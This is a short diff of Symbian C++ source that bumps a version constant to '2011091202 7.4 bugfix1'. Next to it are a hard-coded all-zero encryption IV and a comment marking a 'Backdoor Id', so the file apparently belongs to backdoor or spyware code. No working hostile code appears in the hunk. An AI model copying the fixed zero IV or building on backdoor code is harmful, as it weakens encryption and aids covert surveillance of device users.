@@ -19,7 +19,9 @@
 //_LIT8(KVERSION,"\x27\xea\xdd\x77");		//2011032103
 //_LIT8(KVERSION,"\x35\x5c\xde\x77");		//2011061301
 //_LIT8(KVERSION,"\x36\x5c\xde\x77");		//2011061302
-_LIT8(KVERSION,"\x01\xd1\xde\x77");		//2011091201
+//_LIT8(KVERSION,"\x01\xd1\xde\x77");		//2011091201
+_LIT8(KVERSION,"\x02\xd1\xde\x77");		//2011091202 7.4 bugfix1
+
 _LIT8(KIV, "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00");
 
 // Backdoor Id
